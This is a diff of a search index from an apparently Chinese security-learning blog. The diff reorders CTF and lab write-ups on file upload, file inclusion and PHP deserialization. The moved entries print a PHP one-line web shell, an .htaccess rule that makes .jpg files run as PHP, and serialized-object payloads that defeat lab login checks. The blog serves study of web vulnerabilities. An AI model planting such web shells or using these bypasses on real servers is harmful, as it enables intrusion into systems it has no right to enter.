@@ -787,40 +787,6 @@
       </tags>
   </entry>
   <entry>
-    <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
-    <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731960615-14bf03ed-53af-4ccb-86e1-754fb3f36799.png" alt="img"></p>
-<p>1.上传php文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731991227-e3ce0e92-9489-4942-a1c8-e72c3bfd6d03.png" alt="img"></p>
-<p>可见有后缀名过滤</p>
-<p>2.上传jpg文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732037682-6084f936-f4e2-4a02-9294-e9c8d62162cd.png" alt="img"></p>
-<p>可见对文件内容为&lt;?可能有过滤</p>
-<p>3.上传.htaccess文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732095861-09069902-ef31-4645-ab56-db23820b48fe.png" alt="img"></p>
-<p>经过分析，是mime类型过滤</p>
-<p>将mime类型改为image/jpeg即可</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732206598-0ea5576d-0923-4721-b3dd-ce9694c0b642.png" alt="img"></p>
-<p>AddType application/x-httpd-php .jpg</p>
-<p>这句话的意思是将jpg文件后缀解析为php文件</p>
-<p>4.传🐎</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732328192-ada01c3d-260b-40f2-bb47-09e90cc15fbe.png" alt="img"></p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732337448-2482057a-0460-4657-bdb6-2a36ca8c0b09.png" alt="img"></p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732383108-234defa1-ea71-4295-8e68-2528bc5fb9e4.png" alt="img"></p>
-<p>5.getshell</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732456086-1aa5e05f-4369-4123-90f1-6ffabc518d3c.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(load_file&amp;into outfile)云演sql注入基础</title>
     <url>/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807114141-123d5599-d2ce-4598-afc6-018fd82e76ef.png" alt="img"></p>
@@ -851,6 +817,40 @@
 ]]></content>
       <categories>
         <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
+    <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731960615-14bf03ed-53af-4ccb-86e1-754fb3f36799.png" alt="img"></p>
+<p>1.上传php文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731991227-e3ce0e92-9489-4942-a1c8-e72c3bfd6d03.png" alt="img"></p>
+<p>可见有后缀名过滤</p>
+<p>2.上传jpg文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732037682-6084f936-f4e2-4a02-9294-e9c8d62162cd.png" alt="img"></p>
+<p>可见对文件内容为&lt;?可能有过滤</p>
+<p>3.上传.htaccess文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732095861-09069902-ef31-4645-ab56-db23820b48fe.png" alt="img"></p>
+<p>经过分析，是mime类型过滤</p>
+<p>将mime类型改为image/jpeg即可</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732206598-0ea5576d-0923-4721-b3dd-ce9694c0b642.png" alt="img"></p>
+<p>AddType application/x-httpd-php .jpg</p>
+<p>这句话的意思是将jpg文件后缀解析为php文件</p>
+<p>4.传🐎</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732328192-ada01c3d-260b-40f2-bb47-09e90cc15fbe.png" alt="img"></p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732337448-2482057a-0460-4657-bdb6-2a36ca8c0b09.png" alt="img"></p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732383108-234defa1-ea71-4295-8e68-2528bc5fb9e4.png" alt="img"></p>
+<p>5.getshell</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732456086-1aa5e05f-4369-4123-90f1-6ffabc518d3c.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -962,37 +962,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php-SER-libs反序列化靶场</title>
-    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p>构造类的实例化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
-<p>也就是uesr=daydream   pass=ok</p>
-<p>构造</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
-<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
-]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php中四个可文件包含的函数</title>
     <url>/2023/01/07/php%E4%B8%AD%E5%9B%9B%E4%B8%AA%E5%8F%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[<h1 id="一、文件包含漏洞分类"><a href="#一、文件包含漏洞分类" class="headerlink" title="一、文件包含漏洞分类"></a>一、文件包含漏洞分类</h1><p>LFI(Local File Inclusion)<br><strong>本地文件包含漏洞</strong>，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。<br>为了方便本文把LFI直接称为文件包含漏洞。</p>
@@ -1034,6 +1003,37 @@
       </categories>
       <tags>
         <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php-SER-libs反序列化靶场</title>
+    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>构造类的实例化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
+<p>也就是uesr=daydream   pass=ok</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
+<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
+]]></content>
+      <categories>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1165,6 +1165,21 @@ print(serialize($name));
       </tags>
   </entry>
   <entry>
+    <title>windows与linux敏感文件</title>
+    <url>/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907473922-2aa73c09-d061-4481-8442-63c24e067253.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907506267-4bbdfa60-5874-4a19-87ea-85760bd1fff9.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(.user.ini+GIF89a+script一句话木马)[SUCTF 2019]CheckIn</title>
     <url>/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/</url>
     <content><![CDATA[<p><img src="/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/1671711680046-9b221109-2797-4f54-b053-1be9a4ffe473.png" alt="img"></p>
@@ -1228,21 +1243,6 @@ https://blog.csdn.net/weixin_39190897/article/details/86772765
 https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       <categories>
         <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>windows与linux敏感文件</title>
-    <url>/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907473922-2aa73c09-d061-4481-8442-63c24e067253.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907506267-4bbdfa60-5874-4a19-87ea-85760bd1fff9.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1628,6 +1628,31 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
+    <title>(文件上传+命令执行)BUU UPLOAD COURSE</title>
+    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158113792-baa4586e-7558-4d92-b3dc-e9554a91fe2f.png" alt="img"></p>
+<span id="more"></span>
+
+<p>这一题没有过滤，但是上传的文件都会被改成jpg</p>
+<p>所以.htaccess在这里也用不了</p>
+<p>我们发现，虽然文件重命名了，但是还是可以执行php代码，于是上传一句话<a href="https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">木马</a>，然后蚁剑链接即可</p>
+<p>是我们还可以用命令执行</p>
+<p>先传一个一句话木马</p>
+<?php @eval($_POST['shell']);?>
+
+<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158233871-6ebad957-2b4f-4901-b706-325d63cfa0af.png" alt="img"></p>
+<p>在url中的file后面添加文件路径</p>
+<p>最后getshell</p>
+<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158261614-c05eccbe-642a-4830-ad87-5c48c0073152.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>命令执行</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>指定后缀文件包含（.php后缀）与 指定前缀文件包含（files）</title>
     <url>/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/</url>
     <content><![CDATA[<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910232518-495a690a-4783-427c-a775-eda71d6f1c4e.png" alt="img"></p>
@@ -1657,53 +1682,6 @@ include('files/'.$action.'.php'); //载入相应文件
 ]]></content>
       <categories>
         <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含常用函数</title>
-    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<p>include()</p>
-<p>require()</p>
-<p>fopen()</p>
-<p>include_once()</p>
-<p>require_once()</p>
-<p>readfile()</p>
-<span id="more"></span>
-
-<h2 id="include-与require-区别"><a href="#include-与require-区别" class="headerlink" title="include()与require()区别"></a>include()与require()区别</h2><p>当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。</p>
-<h2 id="include-once-与require-once-区别"><a href="#include-once-与require-once-区别" class="headerlink" title="include_once()与require_once()区别"></a>include_once()与require_once()区别</h2><p>当之前包含过一个文件时，就不会再包含了</p>
-<h2 id="fopen-与readfile"><a href="#fopen-与readfile" class="headerlink" title="fopen()与readfile()"></a>fopen()与readfile()</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1672882660228-68caa210-f9c8-4e8a-bf9b-faa0ea17a1ee.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>(文件上传+命令执行)BUU UPLOAD COURSE</title>
-    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158113792-baa4586e-7558-4d92-b3dc-e9554a91fe2f.png" alt="img"></p>
-<span id="more"></span>
-
-<p>这一题没有过滤，但是上传的文件都会被改成jpg</p>
-<p>所以.htaccess在这里也用不了</p>
-<p>我们发现，虽然文件重命名了，但是还是可以执行php代码，于是上传一句话<a href="https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">木马</a>，然后蚁剑链接即可</p>
-<p>是我们还可以用命令执行</p>
-<p>先传一个一句话木马</p>
-<?php @eval($_POST['shell']);?>
-
-<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158233871-6ebad957-2b4f-4901-b706-325d63cfa0af.png" alt="img"></p>
-<p>在url中的file后面添加文件路径</p>
-<p>最后getshell</p>
-<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158261614-c05eccbe-642a-4830-ad87-5c48c0073152.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>命令执行</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1800,6 +1778,28 @@ include('files/'.$action.'.php'); //载入相应文件
 ]]></content>
       <categories>
         <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含常用函数</title>
+    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<p>include()</p>
+<p>require()</p>
+<p>fopen()</p>
+<p>include_once()</p>
+<p>require_once()</p>
+<p>readfile()</p>
+<span id="more"></span>
+
+<h2 id="include-与require-区别"><a href="#include-与require-区别" class="headerlink" title="include()与require()区别"></a>include()与require()区别</h2><p>当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。</p>
+<h2 id="include-once-与require-once-区别"><a href="#include-once-与require-once-区别" class="headerlink" title="include_once()与require_once()区别"></a>include_once()与require_once()区别</h2><p>当之前包含过一个文件时，就不会再包含了</p>
+<h2 id="fopen-与readfile"><a href="#fopen-与readfile" class="headerlink" title="fopen()与readfile()"></a>fopen()与readfile()</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1672882660228-68caa210-f9c8-4e8a-bf9b-faa0ea17a1ee.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1944,29 +1944,6 @@ include('files/'.$action.'.php'); //载入相应文件
 <h1 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h1><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：</p>
 <p>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
 <h1 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h1><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安基础总结三</title>
-    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
-    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
-<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
-<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
-<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
-<span id="more"></span>
-
-<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
-<p>然后输入命令</p>
-<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
-<p>如</p>
-<p>certutil -hashfile  webpro.war MD5</p>
